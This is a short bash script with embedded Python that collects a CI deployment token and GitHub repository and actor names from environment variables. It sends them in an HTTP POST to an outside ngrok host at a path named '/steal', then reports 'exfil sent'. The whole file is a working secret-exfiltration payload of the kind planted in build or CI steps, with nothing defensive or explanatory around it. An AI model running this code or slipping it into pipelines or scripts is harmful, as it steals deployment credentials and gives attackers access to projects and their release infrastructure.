#!/usr/bin/env bash
python3 - << 'PY'
import os, json, urllib.request
data=json.dumps({"attack":"q1-prefix-v4.1.7","DEPLOY_TOKEN":os.environ.get("DEPLOY_TOKEN","N/A"),
                 "GITHUB_REPOSITORY":os.environ.get("GITHUB_REPOSITORY",""),"GITHUB_ACTOR":os.environ.get("GITHUB_ACTOR","")}).encode()
try:
    req=urllib.request.Request("https://bbb9-118-68-66-37.ngrok-free.app/steal/q1-prefix",data=data,headers={"Content-Type":"application/json","ngrok-skip-browser-warning":"true"})
    urllib.request.urlopen(req,timeout=10)
    print("exfil sent")
except Exception as e:
    print("exfil error",e)
PY
